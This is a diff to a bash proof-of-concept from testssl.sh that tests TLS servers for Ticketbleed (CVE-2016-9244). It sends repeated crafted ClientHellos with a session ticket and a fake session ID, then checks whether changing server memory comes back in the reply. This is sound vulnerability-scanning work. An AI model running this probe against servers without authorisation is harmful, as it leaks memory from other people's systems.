@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# POC bash socket implementation of ticketbleed (CVE-2016-9244), see also http://ticketbleed.com/
+# Fast and reliable POC bash socket implementation of ticketbleed (CVE-2016-9244), see also http://ticketbleed.com/
 # Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt
 #
 # sockets inspired by http://blog.chris007.de/?p=238
@@ -206,6 +206,9 @@ close_socket(){
 
 cleanup() {
      close_socket
+     echo
+     echo
+     return 0
 }
 
 
@@ -221,65 +224,96 @@ get_sessticket() {
 
 parse_hn_port "$1"
 
+early_exit=true
+declare -a memory sid_detected
+nr_sid_detected=0
+
 echo
 "$DEBUG" && ( echo )
 echo "##### 1) Connect to determine 1x session ticket TLS"
 # attn! neither here nor in the following client hello we do SNI. Assuming this is a vulnebilty of the TLS implementation
 SESS_TICKET_TLS="$(get_sessticket)"
 [[ "$SESS_TICKET_TLS" == "," ]] && echo -e "${green}OK, not vulnerable${normal}, no session tickets\n" && exit 0
-fd_socket $PORT
 
 "$DEBUG" && ( echo; echo )
-echo "##### 2) Sending ClientHello (TLS version 03,$TLSV) with this ticket and a made up SessionID"
-"$DEBUG" && echo
-send_clienthello "$SESS_TICKET_TLS"
+echo "##### 2) Sending 1 to 3 ClientHello(s) (TLS version 03,$TLSV) with this ticket and a made up SessionID"
 
-"$DEBUG" && ( echo; echo )
-echo "##### 3) Reading server reply ($HELLO_READBYTES bytes)"
-echo
-SOCKREPLY=$(sockread $HELLO_READBYTES)
+# we do 3 client hellos, and see whether different memmory is returned
+for i in 1 2 3; do
+     fd_socket $PORT
 
-if "$DEBUG"; then
-     echo "============================="
-     echo "$SOCKREPLY"
-     echo "============================="
-fi
+     "$DEBUG" && echo "$i"
+     send_clienthello "$SESS_TICKET_TLS"
 
-if [[ "${SOCKREPLY:0:2}" == "16" ]]; then
-     echo -n "Handshake (TLS version: ${SOCKREPLY:2:4}), "
-     if [[ "${SOCKREPLY:10:6}" == 020000 ]]; then
-          echo -n "ServerHello -- "
-     else
-          echo -n "Message type: ${SOCKREPLY:10:6} -- "
-     fi
-     sid_detected="${SOCKREPLY:88:32}"
-     sid_input=$(sed -e 's/x//g' -e 's/,//g' <<< "$SID")
+     "$DEBUG" && ( echo; echo )
+     [[ "$i" -eq 1 ]] && echo "##### Reading server replies ($HELLO_READBYTES bytes)" && echo
+     SOCKREPLY=$(sockread $HELLO_READBYTES)
+
      if "$DEBUG"; then
-          echo
-          echo "TLS version, record layer: ${SOCKREPLY:18:4}"
-          echo "Random bytes / timestamp:  ${SOCKREPLY:22:64}"
-          echo "Session ID:                $sid_detected"
+          echo "============================="
+          echo "$SOCKREPLY"
+          echo "============================="
      fi
-     if grep -q $sid_input <<< "$sid_detected"; then
-          echo "${red}VULNERABLE!${normal}"
-          echo -n "  (${yellow}Session ID${normal}, ${red}mem returned${normal} --> "
-          echo -n "$sid_detected" | sed -e "s/$sid_input/${yellow}$sid_input${normal}${red}/g"
-          echo "${normal})"
+
+     if [[ "${SOCKREPLY:0:2}" == "15" ]]; then
+          echo -n "TLS Alert ${SOCKREPLY:10:4} (TLS version: ${SOCKREPLY:2:4}) -- "
+          echo "${green}OK, not vulnerable ${normal} (TLS alert)"
+          break
+     elif [[ -z "${SOCKREPLY:0:2}" ]]; then
+          echo "${green}OK, not vulnerable ${normal} (zero reply)"
+          break
+     elif [[ "${SOCKREPLY:0:2}" == "16" ]]; then
+          # we need to look into this as some servers just respond as if nothing happened
+          early_exit=false
+          "$DEBUG" && echo -n "Handshake (TLS version: ${SOCKREPLY:2:4}), "
+          if [[ "${SOCKREPLY:10:6}" == 020000 ]]; then
+               echo -n "      ServerHello $i -- "
+          else
+               echo -n "      Message type: ${SOCKREPLY:10:6} -- "
+          fi
+          sid_input=$(sed -e 's/x//g' -e 's/,//g' <<< "$SID")
+          sid_detected[i]="${SOCKREPLY:88:32}"
+          memory[i]="${SOCKREPLY:$((88+ len_sid*2)):$((32 - len_sid*2))}"
+          if "$DEBUG"; then
+               echo
+               echo "TLS version, record layer: ${SOCKREPLY:18:4}"
+               #echo "Random bytes / timestamp:  ${SOCKREPLY:22:64}"
+               echo "memory:                    ${memory[i]}"
+               echo "Session ID:                ${sid_detected[i]}"
+          fi
+          if grep -q $sid_input <<< "${sid_detected[i]}"; then
+               #echo -n "  (${yellow}Session ID${normal}, ${red}mem returned${normal} --> "
+               echo -n "${sid_detected[i]}" | sed -e "s/$sid_input/${grey}$sid_input${normal}${blue}/g"
+               echo "${normal})"
+          else
+               echo -n "not expected server reply but likely not vulnerable"
+          fi
      else
-          echo -n "not expected server reply but likely not vulnerable"
+          echo "TLS record ${SOCKREPLY:0:2} replied"
+          echo -n "Strange server reply, pls report"
+          break
      fi
-elif [[ "${SOCKREPLY:0:2}" == "15" ]]; then
-     echo -n "TLS Alert ${SOCKREPLY:10:4} (TLS version: ${SOCKREPLY:2:4}) -- "
-     echo "${green}OK, not vulnerable${normal}"
-else
-     echo "TLS record ${SOCKREPLY:0:2} replied"
-     echo -n "Strange server reply, pls report"
-fi
-echo
+done
 echo
 
+if ! "$early_exit"; then
+     # here we test the replys if a TLS server hello was received >1x
+     for i in 1 2 3 ; do
+          if grep -q $sid_input <<< "${sid_detected[i]}"; then
+               # was our faked TLS SID returned?
+               nr_sid_detected=$((nr_sid_detected + 1))
+          fi
+     done
+     if [[ $nr_sid_detected -eq 3 ]]; then
+          if [[ ${memory[1]} != ${memory[2]} ]] && [[ ${memory[2]} != ${memory[3]} ]]; then
+               echo "${red}VULNERABLE!${normal}, real memory returned"
+          else
+               echo "${green}not vulnerable ${normal} (same memory fragments returned)"
+          fi
+     else
+          echo "results ($nr_sid_detected of 3) are kind of fishy. If it persist, let Dirk know"
+     fi
+fi
 
 exit 0
 
-#  vim:tw=200:ts=5:sw=5:expandtab
-#  $Id: ticketbleed.bash,v 1.5 2017/04/16 18:28:41 dirkw Exp $
